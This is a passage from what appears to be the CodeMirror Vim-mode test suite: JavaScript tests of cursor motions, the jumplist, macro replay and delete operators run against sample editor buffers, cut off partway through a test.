var code = '' +
' wOrd1 (#%\n' +
' word3] \n' +
'aopop pop 0 1 2 3 4\n' +
' (a) [b] {c} \n' +
'int getchar(void) {\n' +
'  static char buf[BUFSIZ];\n' +
'  static char *bufp = buf;\n' +
'  if (n == 0) {  /* buffer is empty */\n' +
'    n = read(0, buf, sizeof buf);\n' +
'    bufp = buf;\n' +
'  }\n' +
'\n' +
'  return (--n >= 0) ? (unsigned char) *bufp++ : EOF;\n' +
' \n' +
'}\n';

var lines = (function() {
  lineText = code.split('\n');
  var ret = [];
  for (var i = 0; i < lineText.length; i++) {
    ret[i] = {
      line: i,
      length: lineText[i].length,
      lineText: lineText[i],
      textStart: /^\s*/.exec(lineText[i])[0].length
    };
  }
  return ret;
})();
var endOfDocument = makeCursor(lines.length - 1,
    lines[lines.length - 1].length);
var wordLine = lines[0];
var bigWordLine = lines[1];
var charLine = lines[2];
var bracesLine = lines[3];
var seekBraceLine = lines[4];

var word1 = {
  start: { line: wordLine.line, ch: 1 },
  end: { line: wordLine.line, ch: 5 }
};
var word2 = {
  start: { line: wordLine.line, ch: word1.end.ch + 2 },
  end: { line: wordLine.line, ch: word1.end.ch + 4 }
};
var word3 = {
  start: { line: bigWordLine.line, ch: 1 },
  end: { line: bigWordLine.line, ch: 5 }
};
var bigWord1 = word1;
var bigWord2 = word2;
var bigWord3 = {
  start: { line: bigWordLine.line, ch: 1 },
  end: { line: bigWordLine.line, ch: 7 }
};
var bigWord4 = {
  start: { line: bigWordLine.line, ch: bigWord1.end.ch + 3 },
  end: { line: bigWordLine.line, ch: bigWord1.end.ch + 7 }
};

var oChars = [ { line: charLine.line, ch: 1 },
    { line: charLine.line, ch: 3 },
    { line: charLine.line, ch: 7 } ];
var pChars = [ { line: charLine.line, ch: 2 },
    { line: charLine.line, ch: 4 },
    { line: charLine.line, ch: 6 },
    { line: charLine.line, ch: 8 } ];
var numChars = [ { line: charLine.line, ch: 10 },
    { line: charLine.line, ch: 12 },
    { line: charLine.line, ch: 14 },
    { line: charLine.line, ch: 16 },
    { line: charLine.line, ch: 18 }];
var parens1 = {
  start: { line: bracesLine.line, ch: 1 },
  end: { line: bracesLine.line, ch: 3 }
};
var squares1 = {
  start: { line: bracesLine.line, ch: 5 },
  end: { line: bracesLine.line, ch: 7 }
};
var curlys1 = {
  start: { line: bracesLine.line, ch: 9 },
  end: { line: bracesLine.line, ch: 11 }
};
var seekOutside = {
  start: { line: seekBraceLine.line, ch: 1 },
  end: { line: seekBraceLine.line, ch: 16 }
};
var seekInside = {
  start: { line: seekBraceLine.line, ch: 14 },
  end: { line: seekBraceLine.line, ch: 11 }
};

function copyCursor(cur) {
  return { ch: cur.ch, line: cur.line };
}

function forEach(arr, func) {
  for (var i = 0; i < arr.length; i++) {
    func(arr[i], i, arr);
  }
}

function testVim(name, run, opts, expectedFail) {
  var vimOpts = {
    lineNumbers: true,
    vimMode: true,
    showCursorWhenSelecting: true,
    value: code
  };
  for (var prop in opts) {
    if (opts.hasOwnProperty(prop)) {
      vimOpts[prop] = opts[prop];
    }
  }
  return test('vim_' + name, function() {
    var place = document.getElementById("testground");
    var cm = CodeMirror(place, vimOpts);
    var vim = CodeMirror.Vim.maybeInitVimState_(cm);

    function doKeysFn(cm) {
      return function(args) {
        if (args instanceof Array) {
          arguments = args;
        }
        for (var i = 0; i < arguments.length; i++) {
          CodeMirror.Vim.handleKey(cm, arguments[i]);
        }
      }
    }
    function doInsertModeKeysFn(cm) {
      return function(args) {
        if (args instanceof Array) { arguments = args; }
        function executeHandler(handler) {
          if (typeof handler == 'string') {
            CodeMirror.commands[handler](cm);
          } else {
            handler(cm);
          }
          return true;
        }
        for (var i = 0; i < arguments.length; i++) {
          var key = arguments[i];
          // Find key in keymap and handle.
          var handled = CodeMirror.lookupKey(key, 'vim-insert', executeHandler);
          // Record for insert mode.
          if (handled == "handled" && cm.state.vim.insertMode && arguments[i] != 'Esc') {
            var lastChange = CodeMirror.Vim.getVimGlobalState_().macroModeState.lastInsertModeChanges;
            if (lastChange) {
              lastChange.changes.push(new CodeMirror.Vim.InsertModeKey(key));
            }
          }
        }
      }
    }
    function doExFn(cm) {
      return function(command) {
        cm.openDialog = helpers.fakeOpenDialog(command);
        helpers.doKeys(':');
      }
    }
    function assertCursorAtFn(cm) {
      return function(line, ch) {
        var pos;
        if (ch == null && typeof line.line == 'number') {
          pos = line;
        } else {
          pos = makeCursor(line, ch);
        }
        eqPos(pos, cm.getCursor());
      }
    }
    function fakeOpenDialog(result) {
      return function(text, callback) {
        return callback(result);
      }
    }
    function fakeOpenNotification(matcher) {
      return function(text) {
        matcher(text);
      }
    }
    var helpers = {
      doKeys: doKeysFn(cm),
      // Warning: Only emulates keymap events, not character insertions. Use
      // replaceRange to simulate character insertions.
      // Keys are in CodeMirror format, NOT vim format.
      doInsertModeKeys: doInsertModeKeysFn(cm),
      doEx: doExFn(cm),
      assertCursorAt: assertCursorAtFn(cm),
      fakeOpenDialog: fakeOpenDialog,
      fakeOpenNotification: fakeOpenNotification,
      getRegisterController: function() {
        return CodeMirror.Vim.getRegisterController();
      }
    }
    CodeMirror.Vim.resetVimGlobalState_();
    var successful = false;
    var savedOpenNotification = cm.openNotification;
    try {
      run(cm, vim, helpers);
      successful = true;
    } finally {
      cm.openNotification = savedOpenNotification;
      if (!successful || verbose) {
        place.style.visibility = "visible";
      } else {
        place.removeChild(cm.getWrapperElement());
      }
    }
  }, expectedFail);
};
testVim('qq@q', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('q', 'q', 'l', 'l', 'q');
  helpers.assertCursorAt(0,2);
  helpers.doKeys('@', 'q');
  helpers.assertCursorAt(0,4);
}, { value: '            '});
testVim('@@', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('q', 'q', 'l', 'l', 'q');
  helpers.assertCursorAt(0,2);
  helpers.doKeys('@', 'q');
  helpers.assertCursorAt(0,4);
  helpers.doKeys('@', '@');
  helpers.assertCursorAt(0,6);
}, { value: '            '});
var jumplistScene = ''+
  'word\n'+
  '(word)\n'+
  '{word\n'+
  'word.\n'+
  '\n'+
  'word search\n'+
  '}word\n'+
  'word\n'+
  'word\n';
function testJumplist(name, keys, endPos, startPos, dialog) {
  endPos = makeCursor(endPos[0], endPos[1]);
  startPos = makeCursor(startPos[0], startPos[1]);
  testVim(name, function(cm, vim, helpers) {
    CodeMirror.Vim.resetVimGlobalState_();
    if(dialog)cm.openDialog = helpers.fakeOpenDialog('word');
    cm.setCursor(startPos);
    helpers.doKeys.apply(null, keys);
    helpers.assertCursorAt(endPos);
  }, {value: jumplistScene});
};
testJumplist('jumplist_H', ['H', '<C-o>'], [5,2], [5,2]);
testJumplist('jumplist_M', ['M', '<C-o>'], [2,2], [2,2]);
testJumplist('jumplist_L', ['L', '<C-o>'], [2,2], [2,2]);
testJumplist('jumplist_[[', ['[', '[', '<C-o>'], [5,2], [5,2]);
testJumplist('jumplist_]]', [']', ']', '<C-o>'], [2,2], [2,2]);
testJumplist('jumplist_G', ['G', '<C-o>'], [5,2], [5,2]);
testJumplist('jumplist_gg', ['g', 'g', '<C-o>'], [5,2], [5,2]);
testJumplist('jumplist_%', ['%', '<C-o>'], [1,5], [1,5]);
testJumplist('jumplist_{', ['{', '<C-o>'], [1,5], [1,5]);
testJumplist('jumplist_}', ['}', '<C-o>'], [1,5], [1,5]);
testJumplist('jumplist_\'', ['m', 'a', 'h', '\'', 'a', 'h', '<C-i>'], [1,0], [1,5]);
testJumplist('jumplist_`', ['m', 'a', 'h', '`', 'a', 'h', '<C-i>'], [1,5], [1,5]);
testJumplist('jumplist_*_cachedCursor', ['*', '<C-o>'], [1,3], [1,3]);
testJumplist('jumplist_#_cachedCursor', ['#', '<C-o>'], [1,3], [1,3]);
testJumplist('jumplist_n', ['#', 'n', '<C-o>'], [1,1], [2,3]);
testJumplist('jumplist_N', ['#', 'N', '<C-o>'], [1,1], [2,3]);
testJumplist('jumplist_repeat_<c-o>', ['*', '*', '*', '3', '<C-o>'], [2,3], [2,3]);
testJumplist('jumplist_repeat_<c-i>', ['*', '*', '*', '3', '<C-o>', '2', '<C-i>'], [5,0], [2,3]);
testJumplist('jumplist_repeated_motion', ['3', '*', '<C-o>'], [2,3], [2,3]);
testJumplist('jumplist_/', ['/', '<C-o>'], [2,3], [2,3], 'dialog');
testJumplist('jumplist_?', ['?', '<C-o>'], [2,3], [2,3], 'dialog');
testJumplist('jumplist_skip_delted_mark<c-o>',
             ['*', 'n', 'n', 'k', 'd', 'k', '<C-o>', '<C-o>', '<C-o>'],
             [0,2], [0,2]);
testJumplist('jumplist_skip_delted_mark<c-i>',
             ['*', 'n', 'n', 'k', 'd', 'k', '<C-o>', '<C-i>', '<C-i>'],
             [1,0], [0,2]);

/**
 * @param name Name of the test
 * @param keys An array of keys or a string with a single key to simulate.
 * @param endPos The expected end position of the cursor.
 * @param startPos The position the cursor should start at, defaults to 0, 0.
 */
function testMotion(name, keys, endPos, startPos) {
  testVim(name, function(cm, vim, helpers) {
    if (!startPos) {
      startPos = { line: 0, ch: 0 };
    }
    cm.setCursor(startPos);
    helpers.doKeys(keys);
    helpers.assertCursorAt(endPos);
  });
};

function makeCursor(line, ch) {
  return { line: line, ch: ch };
};

function offsetCursor(cur, offsetLine, offsetCh) {
  return { line: cur.line + offsetLine, ch: cur.ch + offsetCh };
};

// Motion tests
testMotion('|', '|', makeCursor(0, 0), makeCursor(0,4));
testMotion('|_repeat', ['3', '|'], makeCursor(0, 2), makeCursor(0,4));
testMotion('h', 'h', makeCursor(0, 0), word1.start);
testMotion('h_repeat', ['3', 'h'], offsetCursor(word1.end, 0, -3), word1.end);
testMotion('l', 'l', makeCursor(0, 1));
testMotion('l_repeat', ['2', 'l'], makeCursor(0, 2));
testMotion('j', 'j', offsetCursor(word1.end, 1, 0), word1.end);
testMotion('j_repeat', ['2', 'j'], offsetCursor(word1.end, 2, 0), word1.end);
testMotion('j_repeat_clip', ['1000', 'j'], endOfDocument);
testMotion('k', 'k', offsetCursor(word3.end, -1, 0), word3.end);
testMotion('k_repeat', ['2', 'k'], makeCursor(0, 4), makeCursor(2, 4));
testMotion('k_repeat_clip', ['1000', 'k'], makeCursor(0, 4), makeCursor(2, 4));
testMotion('w', 'w', word1.start);
testMotion('w_multiple_newlines_no_space', 'w', makeCursor(12, 2), makeCursor(11, 2));
testMotion('w_multiple_newlines_with_space', 'w', makeCursor(14, 0), makeCursor(12, 51));
testMotion('w_repeat', ['2', 'w'], word2.start);
testMotion('w_wrap', ['w'], word3.start, word2.start);
testMotion('w_endOfDocument', 'w', endOfDocument, endOfDocument);
testMotion('w_start_to_end', ['1000', 'w'], endOfDocument, makeCursor(0, 0));
testMotion('W', 'W', bigWord1.start);
testMotion('W_repeat', ['2', 'W'], bigWord3.start, bigWord1.start);
testMotion('e', 'e', word1.end);
testMotion('e_repeat', ['2', 'e'], word2.end);
testMotion('e_wrap', 'e', word3.end, word2.end);
testMotion('e_endOfDocument', 'e', endOfDocument, endOfDocument);
testMotion('e_start_to_end', ['1000', 'e'], endOfDocument, makeCursor(0, 0));
testMotion('b', 'b', word3.start, word3.end);
testMotion('b_repeat', ['2', 'b'], word2.start, word3.end);
testMotion('b_wrap', 'b', word2.start, word3.start);
testMotion('b_startOfDocument', 'b', makeCursor(0, 0), makeCursor(0, 0));
testMotion('b_end_to_start', ['1000', 'b'], makeCursor(0, 0), endOfDocument);
testMotion('ge', ['g', 'e'], word2.end, word3.end);
testMotion('ge_repeat', ['2', 'g', 'e'], word1.end, word3.start);
testMotion('ge_wrap', ['g', 'e'], word2.end, word3.start);
testMotion('ge_startOfDocument', ['g', 'e'], makeCursor(0, 0),
    makeCursor(0, 0));
testMotion('ge_end_to_start', ['1000', 'g', 'e'], makeCursor(0, 0), endOfDocument);
testMotion('gg', ['g', 'g'], makeCursor(lines[0].line, lines[0].textStart),
    makeCursor(3, 1));
testMotion('gg_repeat', ['3', 'g', 'g'],
    makeCursor(lines[2].line, lines[2].textStart));
testMotion('G', 'G',
    makeCursor(lines[lines.length - 1].line, lines[lines.length - 1].textStart),
    makeCursor(3, 1));
testMotion('G_repeat', ['3', 'G'], makeCursor(lines[2].line,
    lines[2].textStart));
// TODO: Make the test code long enough to test Ctrl-F and Ctrl-B.
testMotion('0', '0', makeCursor(0, 0), makeCursor(0, 8));
testMotion('^', '^', makeCursor(0, lines[0].textStart), makeCursor(0, 8));
testMotion('+', '+', makeCursor(1, lines[1].textStart), makeCursor(0, 8));
testMotion('-', '-', makeCursor(0, lines[0].textStart), makeCursor(1, 4));
testMotion('_', ['6','_'], makeCursor(5, lines[5].textStart), makeCursor(0, 8));
testMotion('$', '$', makeCursor(0, lines[0].length - 1), makeCursor(0, 1));
testMotion('$_repeat', ['2', '$'], makeCursor(1, lines[1].length - 1),
    makeCursor(0, 3));
testMotion('f', ['f', 'p'], pChars[0], makeCursor(charLine.line, 0));
testMotion('f_repeat', ['2', 'f', 'p'], pChars[2], pChars[0]);
testMotion('f_num', ['f', '2'], numChars[2], makeCursor(charLine.line, 0));
testMotion('t', ['t','p'], offsetCursor(pChars[0], 0, -1),
    makeCursor(charLine.line, 0));
testMotion('t_repeat', ['2', 't', 'p'], offsetCursor(pChars[2], 0, -1),
    pChars[0]);
testMotion('F', ['F', 'p'], pChars[0], pChars[1]);
testMotion('F_repeat', ['2', 'F', 'p'], pChars[0], pChars[2]);
testMotion('T', ['T', 'p'], offsetCursor(pChars[0], 0, 1), pChars[1]);
testMotion('T_repeat', ['2', 'T', 'p'], offsetCursor(pChars[0], 0, 1), pChars[2]);
testMotion('%_parens', ['%'], parens1.end, parens1.start);
testMotion('%_squares', ['%'], squares1.end, squares1.start);
testMotion('%_braces', ['%'], curlys1.end, curlys1.start);
testMotion('%_seek_outside', ['%'], seekOutside.end, seekOutside.start);
testMotion('%_seek_inside', ['%'], seekInside.end, seekInside.start);
testVim('%_seek_skip', function(cm, vim, helpers) {
  cm.setCursor(0,0);
  helpers.doKeys(['%']);
  helpers.assertCursorAt(0,9);
}, {value:'01234"("()'});
testVim('%_skip_string', function(cm, vim, helpers) {
  cm.setCursor(0,0);
  helpers.doKeys(['%']);
  helpers.assertCursorAt(0,4);
  cm.setCursor(0,2);
  helpers.doKeys(['%']);
  helpers.assertCursorAt(0,0);
}, {value:'(")")'});
(')')
testVim('%_skip_comment', function(cm, vim, helpers) {
  cm.setCursor(0,0);
  helpers.doKeys(['%']);
  helpers.assertCursorAt(0,6);
  cm.setCursor(0,3);
  helpers.doKeys(['%']);
  helpers.assertCursorAt(0,0);
}, {value:'(/*)*/)'});
// Make sure that moving down after going to the end of a line always leaves you
// at the end of a line, but preserves the offset in other cases
testVim('Changing lines after Eol operation', function(cm, vim, helpers) {
  cm.setCursor(0,0);
  helpers.doKeys(['$']);
  helpers.doKeys(['j']);
  // After moving to Eol and then down, we should be at Eol of line 2
  helpers.assertCursorAt({ line: 1, ch: lines[1].length - 1 });
  helpers.doKeys(['j']);
  // After moving down, we should be at Eol of line 3
  helpers.assertCursorAt({ line: 2, ch: lines[2].length - 1 });
  helpers.doKeys(['h']);
  helpers.doKeys(['j']);
  // After moving back one space and then down, since line 4 is shorter than line 2, we should
  // be at Eol of line 2 - 1
  helpers.assertCursorAt({ line: 3, ch: lines[3].length - 1 });
  helpers.doKeys(['j']);
  helpers.doKeys(['j']);
  // After moving down again, since line 3 has enough characters, we should be back to the
  // same place we were at on line 1
  helpers.assertCursorAt({ line: 5, ch: lines[2].length - 2 });
});
//making sure gj and gk recover from clipping
testVim('gj_gk_clipping', function(cm,vim,helpers){
  cm.setCursor(0, 1);
  helpers.doKeys('g','j','g','j');
  helpers.assertCursorAt(2, 1);
  helpers.doKeys('g','k','g','k');
  helpers.assertCursorAt(0, 1);
},{value: 'line 1\n\nline 2'});
//testing a mix of j/k and gj/gk
testVim('j_k_and_gj_gk', function(cm,vim,helpers){
  cm.setSize(120);
  cm.setCursor(0, 0);
  //go to the last character on the first line
  helpers.doKeys('$');
  //move up/down on the column within the wrapped line
  //side-effect: cursor is not locked to eol anymore
  helpers.doKeys('g','k');
  var cur=cm.getCursor();
  eq(cur.line,0);
  is((cur.ch<176),'gk didn\'t move cursor back (1)');
  helpers.doKeys('g','j');
  helpers.assertCursorAt(0, 176);
  //should move to character 177 on line 2 (j/k preserve character index within line)
  helpers.doKeys('j');
  //due to different line wrapping, the cursor can be on a different screen-x now
  //gj and gk preserve screen-x on movement, much like moveV
  helpers.doKeys('3','g','k');
  cur=cm.getCursor();
  eq(cur.line,1);
  is((cur.ch<176),'gk didn\'t move cursor back (2)');
  helpers.doKeys('g','j','2','g','j');
  //should return to the same character-index
  helpers.doKeys('k');
  helpers.assertCursorAt(0, 176);
},{ lineWrapping:true, value: 'This line is intentially long to test movement of gj and gk over wrapped lines. I will start on the end of this line, then make a step up and back to set the origin for j and k.\nThis line is supposed to be even longer than the previous. I will jump here and make another wiggle with gj and gk, before I jump back to the line above. Both wiggles should not change my cursor\'s target character but both j/k and gj/gk change each other\'s reference position.'});
testVim('gj_gk', function(cm, vim, helpers) {
  if (phantom) return;
  cm.setSize(120);
  // Test top of document edge case.
  cm.setCursor(0, 4);
  helpers.doKeys('g', 'j');
  helpers.doKeys('10', 'g', 'k');
  helpers.assertCursorAt(0, 4);

  // Test moving down preserves column position.
  helpers.doKeys('g', 'j');
  var pos1 = cm.getCursor();
  var expectedPos2 = { line: 0, ch: (pos1.ch - 4) * 2 + 4};
  helpers.doKeys('g', 'j');
  helpers.assertCursorAt(expectedPos2);

  // Move to the last character
  cm.setCursor(0, 0);
  // Move left to reset HSPos
  helpers.doKeys('h');
  // Test bottom of document edge case.
  helpers.doKeys('100', 'g', 'j');
  var endingPos = cm.getCursor();
  is(endingPos != 0, 'gj should not be on wrapped line 0');
  var topLeftCharCoords = cm.charCoords(makeCursor(0, 0));
  var endingCharCoords = cm.charCoords(endingPos);
  is(topLeftCharCoords.left == endingCharCoords.left, 'gj should end up on column 0');
},{ lineNumbers: false, lineWrapping:true, value: 'Thislineisintentiallylongtotestmovementofgjandgkoverwrappedlines.' });
testVim('}', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('}');
  helpers.assertCursorAt(1, 0);
  cm.setCursor(0, 0);
  helpers.doKeys('2', '}');
  helpers.assertCursorAt(4, 0);
  cm.setCursor(0, 0);
  helpers.doKeys('6', '}');
  helpers.assertCursorAt(5, 0);
}, { value: 'a\n\nb\nc\n\nd' });
testVim('{', function(cm, vim, helpers) {
  cm.setCursor(5, 0);
  helpers.doKeys('{');
  helpers.assertCursorAt(4, 0);
  cm.setCursor(5, 0);
  helpers.doKeys('2', '{');
  helpers.assertCursorAt(1, 0);
  cm.setCursor(5, 0);
  helpers.doKeys('6', '{');
  helpers.assertCursorAt(0, 0);
}, { value: 'a\n\nb\nc\n\nd' });

// Operator tests
testVim('dl', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 0);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'l');
  eq('word1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' ', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1 ' });
testVim('dl_eol', function(cm, vim, helpers) {
  cm.setCursor(0, 6);
  helpers.doKeys('d', 'l');
  eq(' word1', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' ', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 6);
}, { value: ' word1 ' });
testVim('dl_repeat', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 0);
  cm.setCursor(curStart);
  helpers.doKeys('2', 'd', 'l');
  eq('ord1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' w', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1 ' });
testVim('dh', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'h');
  eq(' wrd1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('o', register.toString());
  is(!register.linewise);
  eqPos(offsetCursor(curStart, 0 , -1), cm.getCursor());
}, { value: ' word1 ' });
testVim('dj', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'j');
  eq(' word3', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' word1\nword2\n', register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\nword2\n word3' });
testVim('dj_end_of_document', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'j');
  eq(' word1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1 ' });
testVim('dk', function(cm, vim, helpers) {
  var curStart = makeCursor(1, 3);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'k');
  eq(' word3', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' word1\nword2\n', register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\nword2\n word3' });
testVim('dk_start_of_document', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 3);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'k');
  eq(' word1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 3);
}, { value: ' word1 ' });
testVim('dw_space', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 0);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'w');
  eq('word1 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq(' ', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1 ' });
testVim('dw_word', function(cm, vim, helpers) {
  var curStart = makeCursor(0, 1);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'w');
  eq(' word2', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1 ', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1 word2' });
testVim('dw_only_word', function(cm, vim, helpers) {
  // Test that if there is only 1 word left, dw deletes till the end of the
  // line.
  cm.setCursor(0, 1);
  helpers.doKeys('d', 'w');
  eq(' ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1 ', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1 ' });
testVim('dw_eol', function(cm, vim, helpers) {
  // Assert that dw does not delete the newline if last word to delete is at end
  // of line.
  cm.setCursor(0, 1);
  helpers.doKeys('d', 'w');
  eq(' \nword2', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\nword2' });
testVim('dw_eol_with_multiple_newlines', function(cm, vim, helpers) {
  // Assert that dw does not delete the newline if last word to delete is at end
  // of line and it is followed by multiple newlines.
  cm.setCursor(0, 1);
  helpers.doKeys('d', 'w');
  eq(' \n\nword2', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\n\nword2' });
testVim('dw_empty_line_followed_by_whitespace', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('  \nword', cm.getValue());
}, { value: '\n  \nword' });
testVim('dw_empty_line_followed_by_word', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('word', cm.getValue());
}, { value: '\nword' });
testVim('dw_empty_line_followed_by_empty_line', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('\n', cm.getValue());
}, { value: '\n\n' });
testVim('dw_whitespace_followed_by_whitespace', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('\n   \n', cm.getValue());
}, { value: '  \n   \n' });
testVim('dw_whitespace_followed_by_empty_line', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('\n\n', cm.getValue());
}, { value: '  \n\n' });
testVim('dw_word_whitespace_word', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'w');
  eq('\n   \nword2', cm.getValue());
}, { value: 'word1\n   \nword2'})
testVim('dw_end_of_document', function(cm, vim, helpers) {
  cm.setCursor(1, 2);
  helpers.doKeys('d', 'w');
  eq('\nab', cm.getValue());
}, { value: '\nabc' });
testVim('dw_repeat', function(cm, vim, helpers) {
  // Assert that dw does delete newline if it should go to the next line, and
  // that repeat works properly.
  cm.setCursor(0, 1);
  helpers.doKeys('d', '2', 'w');
  eq(' ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1\nword2', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\nword2' });
testVim('de_word_start_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'e');
  eq('\n\n', cm.getValue());
}, { value: 'word\n\n' });
testVim('de_word_end_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  helpers.doKeys('d', 'e');
  eq('wor', cm.getValue());
}, { value: 'word\n\n\n' });
testVim('de_whitespace_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'e');
  eq('', cm.getValue());
}, { value: '   \n\n\n' });
testVim('de_end_of_document', function(cm, vim, helpers) {
  cm.setCursor(1, 2);
  helpers.doKeys('d', 'e');
  eq('\nab', cm.getValue());
}, { value: '\nabc' });
testVim('db_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(2, 0);
  helpers.doKeys('d', 'b');
  eq('\n\n', cm.getValue());
}, { value: '\n\n\n' });
testVim('db_word_start_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(2, 0);
  helpers.doKeys('d', 'b');
  eq('\nword', cm.getValue());
}, { value: '\n\nword' });
testVim('db_word_end_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(2, 3);
  helpers.doKeys('d', 'b');
  eq('\n\nd', cm.getValue());
}, { value: '\n\nword' });
testVim('db_whitespace_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(2, 0);
  helpers.doKeys('d', 'b');
  eq('', cm.getValue());
}, { value: '\n   \n' });
testVim('db_start_of_document', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'b');
  eq('abc\n', cm.getValue());
}, { value: 'abc\n' });
testVim('dge_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(1, 0);
  helpers.doKeys('d', 'g', 'e');
  // Note: In real VIM the result should be '', but it's not quite consistent,
  // since 2 newlines are deleted. But in the similar case of word\n\n, only
  // 1 newline is deleted. We'll diverge from VIM's behavior since it's much
  // easier this way.
  eq('\n', cm.getValue());
}, { value: '\n\n' });
testVim('dge_word_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(1, 0);
  helpers.doKeys('d', 'g', 'e');
  eq('wor\n', cm.getValue());
}, { value: 'word\n\n'});
testVim('dge_whitespace_and_empty_lines', function(cm, vim, helpers) {
  cm.setCursor(2, 0);
  helpers.doKeys('d', 'g', 'e');
  eq('', cm.getValue());
}, { value: '\n  \n' });
testVim('dge_start_of_document', function(cm, vim, helpers) {
  cm.setCursor(0, 0);
  helpers.doKeys('d', 'g', 'e');
  eq('bc\n', cm.getValue());
}, { value: 'abc\n' });
testVim('d_inclusive', function(cm, vim, helpers) {
  // Assert that when inclusive is set, the character the cursor is on gets
  // deleted too.
  var curStart = makeCursor(0, 1);
  cm.setCursor(curStart);
  helpers.doKeys('d', 'e');
  eq('  ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1', register.toString());
  is(!register.linewise);
  eqPos(curStart, cm.getCursor());
}, { value: ' word1 ' });
testVim('d_reverse', function(cm, vim, helpers) {
  // Test that deleting in reverse works.
  cm.setCursor(1, 0);
  helpers.doKeys('d', 'b');
  eq(' word2 ', cm.getValue());
  var register = helpers.getRegisterController().getRegister();
  eq('word1\n', register.toString());
  is(!register.linewise);
  helpers.assertCursorAt(0, 1);
}, { value: ' word1\nword2 ' });
testVim('dd', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 1, ch: 0 });
  var expectedLineCount = cm.lineCount() - 1;
  helpers.doKeys('d', 'd');
  eq(expectedLineCount, cm.lineCount());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, lines[1].textStart);
});
testVim('dd_prefix_repeat', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 2, ch: 0 });
  var expectedLineCount = cm.lineCount() - 2;
  helpers.doKeys('2', 'd', 'd');
  eq(expectedLineCount, cm.lineCount());
  var register = helpers.getRegisterController().getRegister();
  eq(expectedBuffer, register.toString());
  is(register.linewise);
  helpers.assertCursorAt(0, lines[2].textStart);
});
testVim('dd_motion_repeat', function(cm, vim, helpers) {
  cm.setCursor(0, 3);
  var expectedBuffer = cm.getRange({ line: 0, ch: 0 },
    { line: 2, ch: 0 });
  var expectedLineCount = cm.lineCount() - 2;
  helpers.doKeys('d', '2', 'd');
  eq(expectedLineCount, cm.lineCount());
